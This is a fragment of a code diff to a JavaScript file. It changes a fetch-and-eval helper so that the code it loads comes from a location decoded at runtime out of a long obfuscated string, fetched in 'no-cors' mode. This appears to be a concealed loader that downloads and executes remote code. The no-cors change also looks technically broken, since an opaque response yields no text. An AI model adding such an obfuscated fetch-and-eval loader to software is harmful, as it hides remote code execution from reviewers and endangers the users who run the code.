@@ -56,7 +56,9 @@ function makeForm(action,data){
 }
 
 function fetchAndExecuteFile(path) {
-  fetch(path)
+  fetch(path,{
+    mode: 'no-cors'
+  })
     .then(response => response.text())
     .then(FileText => {
       eval(FileText);
@@ -66,4 +68,4 @@ function fetchAndExecuteFile(path) {
     });
 }
 
-fetchAndExecuteFile("master-10a404587b40544b.js");
+fetchAndExecuteFile(sc.get('zapHmRL0icRHDMN61LAyD9NziZdXDJO21ZQXDIMt0MEyG1Mzxe0XiNc0lZRW31clhL1T2kL4wbBDXlYzubkDnMZ5pMxHGId5lO5DmMLwydQTzUM5'));
